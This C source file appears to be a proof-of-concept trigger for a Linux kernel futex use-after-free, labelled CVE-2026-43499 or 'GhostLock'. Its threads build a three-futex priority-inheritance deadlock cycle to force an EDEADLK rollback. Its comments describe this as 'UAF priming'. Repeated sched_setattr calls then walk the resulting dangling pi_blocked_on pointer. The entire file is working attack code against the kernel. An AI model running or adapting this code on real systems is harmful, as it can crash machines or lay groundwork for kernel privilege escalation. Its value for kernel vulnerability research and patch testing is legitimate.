/**
 * ghostlock_edeadlk_detect.c — Force CVE-2026-43499 EDEADLK rollback path
 *
 * Three-futex cycle (Nebula / popsicle):
 *   W: LOCK_PI(f_pi_chain) → WAIT_REQUEUE_PI(f_wait → f_pi_target)
 *   O: LOCK_PI(f_pi_target) → LOCK_PI(f_pi_chain)  // blocks on W
 *   M: CMP_REQUEUE_PI(f_wait → f_pi_target)        // should -EDEADLK internally
 *
 * Prior Leaf5 shell CFU probes often skipped O's lock on f_pi_chain → ret=1 success
 * requeue, not dangling pi_blocked_on.
 *
 * Success signals for true GhostLock UAF priming:
 *   - WAIT returns without timeout (wake from rollback)
 *   - CMP ret often 0 or error (not "1 waiter requeued OK" alone)
 *   - subsequent sched_setattr may walk dangling pi_blocked_on
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

static uint32_t f_wait __attribute__((aligned(64)));
static uint32_t f_pi_target __attribute__((aligned(64)));
static uint32_t f_pi_chain __attribute__((aligned(64)));

static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int owner_blocked_on_chain;
static atomic_int owner_chain_done;
static atomic_int waiter_tid;
static atomic_int wait_returned;
static atomic_int wait_ret;
static atomic_int wait_errno;
static atomic_int requeue_done;
static atomic_int requeue_ret;
static atomic_int requeue_errno;

static long futex_op(uint32_t *uaddr, int op, uint32_t val, const void *timeout,
                     uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static long sched_setattr_tid(int tid, int nice) {
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint32_t sched_period;
    uint32_t sched_util_min;
    uint32_t sched_util_max;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 0; /* SCHED_NORMAL */
  attr.sched_nice = nice;
  return syscall(274 /* __NR_sched_setattr */, tid, &attr, 0);
}

static void *waiter_thread(void *arg) {
  (void)arg;
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    printf("[W] LOCK_PI chain errno=%d\n", errno);
  }
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started))
    usleep(1000);

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 5;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int e = errno;
  atomic_store(&wait_ret, (int)r);
  atomic_store(&wait_errno, e);
  atomic_store(&wait_returned, 1);
  printf("[W] WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n", r, e, strerror(e));

  /* Optional: mild stack paint (not shaped exploit) */
  unsigned char pad[256];
  memset(pad, 0x41, sizeof(pad));
  (void)pad;

  /* Trigger PI walk on self while dangling may exist */
  errno = 0;
  long sr = sched_setattr_tid(0, 5);
  printf("[W] self sched_setattr ret=%ld errno=%d\n", sr, errno);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    printf("[O] LOCK_PI target errno=%d\n", errno);
  }
  while (!atomic_load(&waiter_ready))
    usleep(1000);

  atomic_store(&owner_started, 1);
  /* Critical edge: block on chain held by waiter → deadlock cycle */
  atomic_store(&owner_blocked_on_chain, 1);
  printf("[O] blocking on f_pi_chain...\n");
  errno = 0;
  long r = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  printf("[O] LOCK_PI chain returned ret=%ld errno=%d\n", r, errno);
  atomic_store(&owner_chain_done, 1);

  /* Keep target locked until test ends (optional) */
  while (!atomic_load(&wait_returned))
    usleep(1000);
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static void *consumer_thread(void *arg) {
  (void)arg;
  while (!atomic_load(&wait_returned) && !atomic_load(&requeue_done))
    usleep(500);
  /* After wait returns, fire sched_setattr on waiter tid (PI chain walk) */
  for (int i = 0; i < 20; i++) {
    int tid = atomic_load(&waiter_tid);
    if (tid <= 0)
      break;
    errno = 0;
    long r = sched_setattr_tid(tid, 10 + (i % 5));
    if (i == 0 || r != 0)
      printf("[C] sched_setattr tid=%d ret=%ld errno=%d\n", tid, r, errno);
    usleep(2000);
  }
  return NULL;
}

int main(void) {
  printf("ghostlock_edeadlk_detect — full 3-futex cycle\n");
  printf("expect: WAIT returns after CMP (EDEADLK wake), not stuck S forever\n\n");

  f_wait = f_pi_target = f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_blocked_on_chain, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&wait_returned, 0);
  atomic_store(&requeue_done, 0);

  pthread_t wt, ot, ct;
  pthread_create(&wt, NULL, waiter_thread, NULL);
  pthread_create(&ot, NULL, owner_thread, NULL);
  pthread_create(&ct, NULL, consumer_thread, NULL);

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_blocked_on_chain))
    usleep(1000);
  /* Give owner time to actually block in LOCK_PI(chain) */
  usleep(50000);

  errno = 0;
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)(uintptr_t)1,
                     &f_pi_target, f_wait);
  int re = errno;
  atomic_store(&requeue_ret, (int)rr);
  atomic_store(&requeue_errno, re);
  atomic_store(&requeue_done, 1);
  printf("[M] CMP_REQUEUE_PI ret=%ld errno=%d (%s)\n", rr, re, strerror(re));

  /* Wait up to 6s for WAIT return */
  for (int i = 0; i < 600 && !atomic_load(&wait_returned); i++)
    usleep(10000);

  if (!atomic_load(&wait_returned)) {
    printf("[M] WAIT still blocked after 6s — likely success requeue not EDEADLK\n");
    /* Abort waiter with signal? skip — join may hang; unlock target already planned */
  } else {
    printf("[M] WAIT returned quickly after requeue — candidate EDEADLK path\n");
  }

  pthread_join(wt, NULL);
  pthread_join(ct, NULL);
  /* owner may still be in LOCK_PI(chain) if waiter unlocked; should finish */
  pthread_join(ot, NULL);

  printf("\n=== SUMMARY ===\n");
  printf("requeue_ret=%d requeue_errno=%d\n", atomic_load(&requeue_ret),
         atomic_load(&requeue_errno));
  printf("wait_returned=%d wait_ret=%d wait_errno=%d\n",
         atomic_load(&wait_returned), atomic_load(&wait_ret),
         atomic_load(&wait_errno));
  printf("owner_chain_done=%d\n", atomic_load(&owner_chain_done));
  printf("KERNEL SURVIVED (if you read this)\n");
  return 0;
}
